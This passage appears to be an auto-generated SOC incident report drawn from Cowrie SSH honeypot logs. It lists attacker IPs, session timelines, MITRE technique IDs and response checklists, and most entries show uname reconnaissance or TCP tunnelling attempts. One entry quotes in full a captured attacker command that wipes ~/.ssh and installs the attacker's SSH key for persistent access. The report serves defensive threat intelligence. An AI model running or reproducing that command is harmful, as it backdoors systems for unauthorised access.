| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 21:09:13` | `cowrie.session.connect` |
| `2026-07-26 21:09:13` | `cowrie.client.version` |
| `2026-07-26 21:09:13` | `cowrie.client.kex` |
| `2026-07-26 21:09:14` | `cowrie.login.success` |
| `2026-07-26 21:09:15` | `cowrie.session.params` |
| `2026-07-26 21:09:15` | `cowrie.command.input` |
| `2026-07-26 21:09:15` | `cowrie.log.closed` |
| `2026-07-26 21:09:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.146[.]161` to AbuseIPDB if not already reported
- [ ] Block `157.245.146[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbeb70724b87

| Field | Detail |
|---|---|
| **Source IP** | `157.245.146[.]161` |
| **First Seen** | 2026-07-26 21:12 |
| **Last Seen** | 2026-07-26 21:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 21:12:25` | `cowrie.session.connect` |
| `2026-07-26 21:12:25` | `cowrie.client.version` |
| `2026-07-26 21:12:25` | `cowrie.client.kex` |
| `2026-07-26 21:12:26` | `cowrie.login.success` |
| `2026-07-26 21:12:27` | `cowrie.session.params` |
| `2026-07-26 21:12:27` | `cowrie.command.input` |
| `2026-07-26 21:12:27` | `cowrie.log.closed` |
| `2026-07-26 21:12:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.146[.]161` to AbuseIPDB if not already reported
- [ ] Block `157.245.146[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-296bd1c44b57

| Field | Detail |
|---|---|
| **Source IP** | `157.245.146[.]161` |
| **First Seen** | 2026-07-26 21:15 |
| **Last Seen** | 2026-07-26 21:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 21:15:39` | `cowrie.session.connect` |
| `2026-07-26 21:15:39` | `cowrie.client.version` |
| `2026-07-26 21:15:39` | `cowrie.client.kex` |
| `2026-07-26 21:15:40` | `cowrie.login.success` |
| `2026-07-26 21:15:41` | `cowrie.session.params` |
| `2026-07-26 21:15:41` | `cowrie.command.input` |
| `2026-07-26 21:15:41` | `cowrie.log.closed` |
| `2026-07-26 21:15:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.146[.]161` to AbuseIPDB if not already reported
- [ ] Block `157.245.146[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8912478676cd

| Field | Detail |
|---|---|
| **Source IP** | `157.245.146[.]161` |
| **First Seen** | 2026-07-26 21:18 |
| **Last Seen** | 2026-07-26 21:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 21:18:42` | `cowrie.session.connect` |
| `2026-07-26 21:18:42` | `cowrie.client.version` |
| `2026-07-26 21:18:42` | `cowrie.client.kex` |
| `2026-07-26 21:18:43` | `cowrie.login.success` |
| `2026-07-26 21:18:44` | `cowrie.session.params` |
| `2026-07-26 21:18:44` | `cowrie.command.input` |
| `2026-07-26 21:18:44` | `cowrie.log.closed` |
| `2026-07-26 21:18:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.146[.]161` to AbuseIPDB if not already reported
- [ ] Block `157.245.146[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a22c0cb18497

| Field | Detail |
|---|---|
| **Source IP** | `61.145.181[.]7` |
| **First Seen** | 2026-07-26 21:22 |
| **Last Seen** | 2026-07-26 21:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 21:22:13` | `cowrie.session.connect` |
| `2026-07-26 21:22:14` | `cowrie.client.version` |
| `2026-07-26 21:22:14` | `cowrie.client.kex` |
| `2026-07-26 21:22:15` | `cowrie.login.success` |
| `2026-07-26 21:22:16` | `cowrie.direct-tcpip.request` |
| `2026-07-26 21:22:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.145.181[.]7` to AbuseIPDB if not already reported
- [ ] Block `61.145.181[.]7` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be42d625994f

| Field | Detail |
|---|---|
| **Source IP** | `213.230.64[.]246` |
| **First Seen** | 2026-07-26 21:22 |
| **Last Seen** | 2026-07-26 21:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 21:22:22` | `cowrie.session.connect` |
| `2026-07-26 21:22:22` | `cowrie.client.version` |
| `2026-07-26 21:22:22` | `cowrie.client.kex` |
| `2026-07-26 21:22:23` | `cowrie.login.success` |
| `2026-07-26 21:22:24` | `cowrie.direct-tcpip.request` |
| `2026-07-26 21:22:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.230.64[.]246` to AbuseIPDB if not already reported
- [ ] Block `213.230.64[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21c6b1b9df70

| Field | Detail |
|---|---|
| **Source IP** | `187.115.144[.]103` |
| **First Seen** | 2026-07-26 21:28 |
| **Last Seen** | 2026-07-26 21:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 21:28:59` | `cowrie.session.connect` |
| `2026-07-26 21:28:59` | `cowrie.client.version` |
| `2026-07-26 21:28:59` | `cowrie.client.kex` |
| `2026-07-26 21:29:01` | `cowrie.login.success` |
| `2026-07-26 21:29:02` | `cowrie.direct-tcpip.request` |
| `2026-07-26 21:29:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.115.144[.]103` to AbuseIPDB if not already reported
- [ ] Block `187.115.144[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68a65b8e6654

| Field | Detail |
|---|---|
| **Source IP** | `122.160.142[.]194` |
| **First Seen** | 2026-07-26 21:29 |
| **Last Seen** | 2026-07-26 21:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 21:29:07` | `cowrie.session.connect` |
| `2026-07-26 21:29:08` | `cowrie.client.version` |
| `2026-07-26 21:29:08` | `cowrie.client.kex` |
| `2026-07-26 21:29:10` | `cowrie.login.success` |
| `2026-07-26 21:29:11` | `cowrie.direct-tcpip.request` |
| `2026-07-26 21:29:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.160.142[.]194` to AbuseIPDB if not already reported
- [ ] Block `122.160.142[.]194` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0ce6a2eb84a

| Field | Detail |
|---|---|
| **Source IP** | `169.58.9[.]58` |
| **First Seen** | 2026-07-26 21:30 |
| **Last Seen** | 2026-07-26 21:30 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 21:30:06` | `cowrie.session.connect` |
| `2026-07-26 21:30:06` | `cowrie.client.version` |
| `2026-07-26 21:30:06` | `cowrie.client.kex` |
| `2026-07-26 21:30:08` | `cowrie.login.success` |
| `2026-07-26 21:30:10` | `cowrie.session.params` |
| `2026-07-26 21:30:10` | `cowrie.command.input` |
| `2026-07-26 21:30:11` | `cowrie.log.closed` |
| `2026-07-26 21:30:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.58.9[.]58` to AbuseIPDB if not already reported
- [ ] Block `169.58.9[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59cdf8bf2835

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-26 21:39 |
| **Last Seen** | 2026-07-26 21:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 21:39:37` | `cowrie.session.connect` |
| `2026-07-26 21:39:37` | `cowrie.client.version` |
| `2026-07-26 21:39:37` | `cowrie.client.kex` |
| `2026-07-26 21:39:37` | `cowrie.login.success` |
| `2026-07-26 21:39:37` | `cowrie.direct-tcpip.request` |
| `2026-07-26 21:39:37` | `cowrie.direct-tcpip.data` |
| `2026-07-26 21:39:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6bef7a95d6e

| Field | Detail |
|---|---|
| **Source IP** | `124.152.90[.]68` |
| **First Seen** | 2026-07-26 21:42 |
| **Last Seen** | 2026-07-26 21:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 21:42:07` | `cowrie.session.connect` |
| `2026-07-26 21:42:08` | `cowrie.client.version` |
| `2026-07-26 21:42:08` | `cowrie.client.kex` |
| `2026-07-26 21:42:09` | `cowrie.login.success` |
| `2026-07-26 21:42:10` | `cowrie.direct-tcpip.request` |
| `2026-07-26 21:42:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.152.90[.]68` to AbuseIPDB if not already reported
- [ ] Block `124.152.90[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c15cead9b2f9

| Field | Detail |
|---|---|
| **Source IP** | `203.192.211[.]180` |
| **First Seen** | 2026-07-26 21:42 |
| **Last Seen** | 2026-07-26 21:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 21:42:15` | `cowrie.session.connect` |
| `2026-07-26 21:42:16` | `cowrie.client.version` |
| `2026-07-26 21:42:16` | `cowrie.client.kex` |
| `2026-07-26 21:42:17` | `cowrie.login.success` |
| `2026-07-26 21:42:18` | `cowrie.direct-tcpip.request` |
| `2026-07-26 21:42:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.192.211[.]180` to AbuseIPDB if not already reported
- [ ] Block `203.192.211[.]180` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cc1a129edef

| Field | Detail |
|---|---|
| **Source IP** | `45.181.101[.]95` |
| **First Seen** | 2026-07-26 21:43 |
| **Last Seen** | 2026-07-26 21:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 21:43:02` | `cowrie.session.connect` |
| `2026-07-26 21:43:02` | `cowrie.client.version` |
| `2026-07-26 21:43:02` | `cowrie.client.kex` |
| `2026-07-26 21:43:04` | `cowrie.login.success` |
| `2026-07-26 21:43:05` | `cowrie.direct-tcpip.request` |
| `2026-07-26 21:43:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.181.101[.]95` to AbuseIPDB if not already reported
- [ ] Block `45.181.101[.]95` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3a24729011c

| Field | Detail |
|---|---|
| **Source IP** | `202.138.229[.]190` |
| **First Seen** | 2026-07-26 21:43 |
| **Last Seen** | 2026-07-26 21:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 21:43:10` | `cowrie.session.connect` |
| `2026-07-26 21:43:11` | `cowrie.client.version` |
| `2026-07-26 21:43:11` | `cowrie.client.kex` |
| `2026-07-26 21:43:13` | `cowrie.login.success` |
| `2026-07-26 21:43:14` | `cowrie.direct-tcpip.request` |
| `2026-07-26 21:43:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.138.229[.]190` to AbuseIPDB if not already reported
- [ ] Block `202.138.229[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4263daa623d3

| Field | Detail |
|---|---|
| **Source IP** | `103.51.216[.]200` |
| **First Seen** | 2026-07-26 21:44 |
| **Last Seen** | 2026-07-26 21:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 21:44:42` | `cowrie.session.connect` |
| `2026-07-26 21:44:42` | `cowrie.client.version` |
| `2026-07-26 21:44:42` | `cowrie.client.kex` |
| `2026-07-26 21:44:43` | `cowrie.login.success` |
| `2026-07-26 21:44:44` | `cowrie.session.params` |
| `2026-07-26 21:44:44` | `cowrie.command.input` |
| `2026-07-26 21:44:44` | `cowrie.command.failed` |
| `2026-07-26 21:44:44` | `cowrie.log.closed` |
| `2026-07-26 21:44:45` | `cowrie.session.params` |
| `2026-07-26 21:44:45` | `cowrie.command.input` |
| `2026-07-26 21:44:46` | `cowrie.session.file_download` |
| `2026-07-26 21:44:46` | `cowrie.log.closed` |
| `2026-07-26 21:44:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.51.216[.]200` to AbuseIPDB if not already reported
- [ ] Block `103.51.216[.]200` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b00cd4de375d

| Field | Detail |
|---|---|
| **Source IP** | `103.51.216[.]200` |
| **First Seen** | 2026-07-26 21:44 |
| **Last Seen** | 2026-07-26 21:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 21:44:46` | `cowrie.session.connect` |
| `2026-07-26 21:44:46` | `cowrie.client.version` |
| `2026-07-26 21:44:46` | `cowrie.client.kex` |
| `2026-07-26 21:44:47` | `cowrie.login.success` |
| `2026-07-26 21:44:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.51.216[.]200` to AbuseIPDB if not already reported
- [ ] Block `103.51.216[.]200` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd36b30689c3

| Field | Detail |
|---|---|
| **Source IP** | `103.51.216[.]200` |
| **First Seen** | 2026-07-26 21:44 |
| **Last Seen** | 2026-07-26 21:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 21:44:47` | `cowrie.session.connect` |
| `2026-07-26 21:44:47` | `cowrie.client.version` |
| `2026-07-26 21:44:47` | `cowrie.client.kex` |
| `2026-07-26 21:44:48` | `cowrie.login.success` |
| `2026-07-26 21:44:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.51.216[.]200` to AbuseIPDB if not already reported
- [ ] Block `103.51.216[.]200` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-172045134afc

| Field | Detail |
|---|---|
| **Source IP** | `121.159.71[.]249` |
| **First Seen** | 2026-07-26 21:45 |
| **Last Seen** | 2026-07-26 21:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 21:45:17` | `cowrie.session.connect` |
| `2026-07-26 21:45:18` | `cowrie.client.version` |
| `2026-07-26 21:45:18` | `cowrie.client.kex` |
| `2026-07-26 21:45:20` | `cowrie.login.success` |
| `2026-07-26 21:45:21` | `cowrie.direct-tcpip.request` |
| `2026-07-26 21:45:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.159.71[.]249` to AbuseIPDB if not already reported
- [ ] Block `121.159.71[.]249` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da6e8db1cd99

| Field | Detail |
|---|---|
| **Source IP** | `66.45.144[.]201` |
| **First Seen** | 2026-07-26 21:46 |
| **Last Seen** | 2026-07-26 21:46 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 21:46:10` | `cowrie.session.connect` |
| `2026-07-26 21:46:11` | `cowrie.client.version` |
| `2026-07-26 21:46:11` | `cowrie.client.kex` |
| `2026-07-26 21:46:12` | `cowrie.login.success` |
| `2026-07-26 21:46:12` | `cowrie.direct-tcpip.request` |
| `2026-07-26 21:46:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `66.45.144[.]201` to AbuseIPDB if not already reported
- [ ] Block `66.45.144[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34b4a4e4d18c

| Field | Detail |
|---|---|
| **Source IP** | `117.226.48[.]35` |
| **First Seen** | 2026-07-26 21:49 |
| **Last Seen** | 2026-07-26 21:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 21:49:56` | `cowrie.session.connect` |
| `2026-07-26 21:49:57` | `cowrie.client.version` |
| `2026-07-26 21:49:57` | `cowrie.client.kex` |
| `2026-07-26 21:49:59` | `cowrie.login.success` |
| `2026-07-26 21:50:00` | `cowrie.direct-tcpip.request` |
| `2026-07-26 21:50:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.226.48[.]35` to AbuseIPDB if not already reported
- [ ] Block `117.226.48[.]35` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58151a78ba32

| Field | Detail |
|---|---|
| **Source IP** | `188.43.204[.]45` |
| **First Seen** | 2026-07-26 21:50 |
| **Last Seen** | 2026-07-26 21:50 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 21:50:05` | `cowrie.session.connect` |
| `2026-07-26 21:50:05` | `cowrie.client.version` |
| `2026-07-26 21:50:05` | `cowrie.client.kex` |
| `2026-07-26 21:50:06` | `cowrie.login.success` |
| `2026-07-26 21:50:06` | `cowrie.direct-tcpip.request` |
| `2026-07-26 21:50:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.43.204[.]45` to AbuseIPDB if not already reported
- [ ] Block `188.43.204[.]45` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c2f7310578a

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-26 21:52 |
| **Last Seen** | 2026-07-26 21:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 21:52:59` | `cowrie.session.connect` |
| `2026-07-26 21:52:59` | `cowrie.client.version` |
| `2026-07-26 21:52:59` | `cowrie.client.kex` |
| `2026-07-26 21:53:00` | `cowrie.login.success` |
| `2026-07-26 21:53:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a601e383c073

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-26 21:52 |
| **Last Seen** | 2026-07-26 21:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 21:52:59` | `cowrie.session.connect` |
| `2026-07-26 21:52:59` | `cowrie.client.version` |
| `2026-07-26 21:52:59` | `cowrie.client.kex` |
| `2026-07-26 21:53:00` | `cowrie.login.success` |
| `2026-07-26 21:53:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-daae4425fcff

| Field | Detail |
|---|---|
| **Source IP** | `218.58.73[.]238` |
| **First Seen** | 2026-07-26 21:53 |
| **Last Seen** | 2026-07-26 21:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 21:53:19` | `cowrie.session.connect` |
| `2026-07-26 21:53:19` | `cowrie.client.version` |
| `2026-07-26 21:53:19` | `cowrie.client.kex` |
| `2026-07-26 21:53:22` | `cowrie.login.success` |
| `2026-07-26 21:53:22` | `cowrie.direct-tcpip.request` |
| `2026-07-26 21:53:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.58.73[.]238` to AbuseIPDB if not already reported
- [ ] Block `218.58.73[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ff3bb18a965

| Field | Detail |
|---|---|
| **Source IP** | `74.208.177[.]56` |
| **First Seen** | 2026-07-26 21:53 |
| **Last Seen** | 2026-07-26 21:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 21:53:27` | `cowrie.session.connect` |
| `2026-07-26 21:53:28` | `cowrie.client.version` |
| `2026-07-26 21:53:28` | `cowrie.client.kex` |
| `2026-07-26 21:53:29` | `cowrie.login.success` |
| `2026-07-26 21:53:29` | `cowrie.direct-tcpip.request` |
| `2026-07-26 21:53:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.208.177[.]56` to AbuseIPDB if not already reported
- [ ] Block `74.208.177[.]56` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01d50245890a

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-26 21:59 |
| **Last Seen** | 2026-07-26 21:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
